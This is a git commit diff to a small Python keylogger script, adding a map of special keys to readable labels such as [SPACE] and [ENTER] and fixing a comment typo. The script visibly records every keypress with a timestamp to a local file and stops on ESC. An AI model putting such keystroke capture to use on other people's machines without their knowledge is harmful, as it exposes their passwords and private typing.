16b2c6fcaf5bdbef3355ebd40faccb32b1d331fb
J17M <juan17monarrezg@gmail.com>
2025-05-21 20:16:36 -0600

    Added dictionary which maps a few special keys to a more readable format & added .gitignore file for log file (used for testing)

--- logger.py
+++ logger.py
@@ -3,6 +3,20 @@ import datetime
 
 logFile = "log.txt"
 
+# Dictionary of special keys that are converted to labels for easier readability in log file
+mappedKeys = {
+    'Key.space': '[SPACE]',
+    'Key.enter': '[ENTER]',
+    'Key.backspace': '[BACKSPACE]',
+    'Key.tab': '[TAB]',
+    'Key.shift': '[SHIFT]',
+    'Key.up': '[UP]',
+    'Key.down': '[DOWN]',
+    'Key.left': '[LEFT]',
+    'Key.right': '[RIGHT]',
+    'Key.caps_lock': '[CAPSLOCK]',
+}
+
 def press(key):
     # gets current timestamp
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -12,6 +26,8 @@ def press(key):
     except AttributeError:
         # prints special keys such as ctrl or shift, gets converted to string so that it could be logged
         key = str(key)
+    # Replace key with mapped label if it's a special key; stays unchanged if not special key
+    key = mappedKeys.get(key, key)
 
     # Opens log file and appends every key pressed as well as its timestamp
     with open(logFile, "a") as file:
@@ -27,5 +43,7 @@ if __name__ == "__main__":
     print("Keylogger started, press ESC to exit")
 
     with keyboard.Listener(on_press=press, on_release=release) as listener:
-        # listener remmains running until release() returns False
+        # listener remains running until release() returns False
         listener.join()
+
+
